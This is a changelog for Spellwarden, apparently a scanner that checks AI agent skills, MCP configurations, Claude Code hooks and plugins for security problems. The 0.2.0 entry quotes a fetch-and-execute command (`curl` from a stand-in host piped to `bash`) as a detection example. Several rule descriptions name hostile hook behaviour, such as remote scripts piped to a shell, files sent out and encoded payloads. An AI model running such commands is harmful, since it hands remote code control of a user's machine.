# Changelog

## 1.1.0 (2026-10-21)

An engine release: names are added, nothing is removed or changed. The rules version stays `2026.10.2`, every
fingerprint of 1.0.0 is unchanged, and the `spellwarden` command, its files and its reports are as in 1.0.0 apart
from the version they print. The GitHub Action and the GitLab CI/CD component are not re-released and stay at 1.0.0.

- Org rules: `validate_org_rule` and `compile_org_rule` turn a JSON rule spec (`SW-ORG-001` to `SW-ORG-999`) into a
  `Rule`: a file pattern for skills, read line by line or shell command by shell command, in a small pattern
  language that runs in bounded time (`PATTERN_LIMITS`, among them `max_repeat_range`: the repeats of one part
  may vary by at most 400 in all) and reads the same in Kong apart from the Unicode classes `\w`, `\d`, `\s` and
  `\b`, or one of eight checks of a probed MCP server. A host allowlist check never matches a host that is not a
  plain host name. `scan_skill_package` and `evaluate_probe` take `org_rule_budget=OrgRuleBudget(clock, seconds)`,
  and their results carry `org_rules_incomplete` (left out of `to_dict()` when empty, so a 1.0.0 report keeps its
  bytes). The pattern language refuses repeats that could make matching slow. `make_rule` still refuses `SW-ORG` ids.
- Policy packs: the eight enforcement rules (`ENFORCEMENT_RULES`), the Spellwarden baseline pack 1.0
  (`baseline_pack()`, also `packs/baseline.json`), the pack document of schema 1 (`schemas/pack.schema.json`,
  `validate_pack`, `canonical_json`, `pack_sha256`) and the text rules for names and titles (`valid_line`,
  `valid_block`, `comment_safe`).
- Exports (`build_export`): Claude Code hooks with a standard-library guard script, in a project mode (advisory) and
  a managed mode for administrators (`allowManagedHooksOnly`, the script outside every checkout), and Kong
  (`ai-prompt-guard` deny patterns in a decK file, read line by line; a pattern with several parts becomes a chain
  of atomic groups, `kong_pattern`, so a long prompt cannot make the gateway backtrack). Each export lists what its
  target cannot enforce, and the hooks export states the guard's limits: an event larger than 1 MiB is let through
  unchecked, and a missing guard script blocks every matched tool call. The hooks also
  cover Claude Code's PowerShell tool. The CI job `managed-guard` checks the managed mode on Linux, macOS and
  Windows (Git Bash, PowerShell and cmd).
- `ToolInfo.input_schema`: the prober records a tool's `inputSchema` when it is a JSON object of at most 16 KiB.
- `spellwarden_cli.settings` imports the path glob from `spellwarden_scan.glob`, its new home.

## 1.0.0 (2026-10-20)

The scanner, its files and its report are now a stable public contract (`schemas/`, kept compatible from this
release on: a field, an enumeration value or an exit code is only removed or changed in a major version). The rules
version is unchanged.

- Released together with the same version number: the PyPI package, the container image
  `ghcr.io/spellwarden-ai/spellwarden:1.0.0` (cosign-signed, with build provenance for the image and the wheel inside
  it), the GitHub Action `spellwarden-ai/scan@v1.0.0` and the GitLab CI/CD component
  `gitlab.com/spellwarden-ai/scan/scan@1.0.0`, whose tags are SSH-signed. A release manifest attached to the GitHub
  release names all four and is itself attested.
- Golden files of this release under `tests/golden/1.0.0/`: later releases must read its lock, baseline and
  settings files and produce reports that validate against its schemas.

## 0.3.0 (2026-10-20)

Rules version `2026.10.2`: ten rules added; no existing rule changed what it detects (every fingerprint of
0.2.0 is unchanged, `tests/golden/fingerprints-0.2.0.json`).

- The `spellwarden` command (`spellwarden_cli`, in the same distribution): `scan`, `lock`, `baseline add|prune|list`,
  `rules`, `ci comment`, `ci-run gitlab` and `version`. It lists a repository's files through git, finds skills,
  MCP client configurations (`.mcp.json`, `.vscode/mcp.json`, `.cursor/mcp.json`), Claude Code settings and hooks, and
  plugin marketplaces with their local plugins, scans them, and reports as text, JSON, SARIF 2.1.0, Markdown or GitLab
  Code Quality. Exit codes 0 (passed), 1 (findings), 2 (incomplete or invalid) and 3 (stale lock).
- `.spellwarden/lock.json` pins every discovered configuration file, server, plugin source, local plugin directory and
  skill by hash; `.spellwarden/baseline.yml` accepts findings with a reason, an addition date and an expiry date
  (at most 365 days, 30 for a malicious-indicator rule). JSON Schemas for both, for the settings and for the report.
  On a pull or merge request, `.spellwarden/config.yml` and the baseline are read from the base revision, so a
  request cannot exclude or accept its own finding.
- Rules SW-CFG-001 to SW-CFG-010 judge agent configuration files: plain-HTTP and raw-IP servers, credentials and
  literal secrets in server configurations, unpinned launchers (also behind one `env`, `sh -c` or `cmd /c`, and
  through `npm exec`, `pnpx`, `bun x` and `uv tool run`), hooks that pipe remote scripts to a shell, send local
  files out or run encoded payloads, settings that switch off approval prompts, and marketplace plugins without a
  declared commit pin. SW-CFG-006 and SW-CFG-007 are malicious indicators.
- The engine: `parse_mcp_config`, `parse_settings`, `parse_hooks`, `parse_marketplace`, `parse_plugin_manifest`
  (JSON with comments, duplicate keys refused, every document bounded) and `scan_agent_config`;
  `logical_commands` and the shell detectors are shared by skills and hooks. Evidence masks more: passwords given
  as command options (`-u user:pass`, `--password`), credential header values, and URL userinfo through its last
  `@`; fingerprints are unchanged.
- A symbolic link at an agent-content path, or inside a skill or local plugin directory, is followed when its
  target is a file of the repository inside the scan root; a skill or plugin link whose relative target leaves
  the scan root is skipped and its target text locked, and an absolute target is an error. Configuration file
  names match whatever their case, while link targets, manifest references and a plugin's own files must be
  named exactly (another case or Unicode form is an error); a skill is a directory holding exactly `SKILL.md`
  (another spelling gets a notice, and is judged as `SKILL.md` under a `skills/` directory). A marketplace plugin
  with the source `./` is the marketplace's own directory.
- `--probe` runs the unauthenticated MCP probe of the hosted product from your machine or runner, with its SSRF rules
  and a budget of 50 servers, 300 requests and 120 seconds; the configured servers' private addresses only with
  `--probe-private` on a local run or a push, schedule or manual run of a protected ref, never a link-local address
  and never an address a server's answer points to. The prober moved here from the hosted backend, which now uses
  this copy.
- In CI, a pseudonymous usage ping with five fields (README "The usage ping"); off with `--no-telemetry`,
  `SPELLWARDEN_TELEMETRY=off`, `DO_NOT_TRACK=1` or `telemetry: false`.

## 0.2.0 (2026-10-20)

Rules version `2026.10.1`: one rule detects more.

- SW-SKL-007 reads the fenced code blocks of a Markdown file as scripts: a pipe continued on the next line
  (`curl -s https://x.example/i.sh |` then `bash`, or a command after `apt-get update &&`) is one command,
  reported once at its first line. A command 0.1.0 already reported on one line keeps its fingerprint (its
  triage carries over); one that a neighbouring line now joins is the joined command, a new fingerprint, so an
  accepted finding there opens once more. A fenced line ending in `\` is no longer joined with the closing fence.

## 0.1.0 (2026-10-19)

The first release: the engine of the hosted Spellwarden product as a library.

- `scan_skill_package` with 17 skill rules (SW-SKL-001 to 015, 019, 031), the canonical package hash, frontmatter metadata, bounded findings (500 per scan, 100 per rule, worst severity first) and masked evidence.
- `evaluate_probe` with 11 MCP rules (SW-MCP-001 to 011), transport, authentication and spec-version classification, deprecated features, migration status and the twelve-item migration checklist.
- `curation_score`, `is_curated`, `is_quarantined`.
- `unpack_zip` with zip-slip, symlink, size and file-count protection; `canonical_sha256`; `parse_frontmatter`; `mask_credentials`.
- Rules version `2026.10.0`.
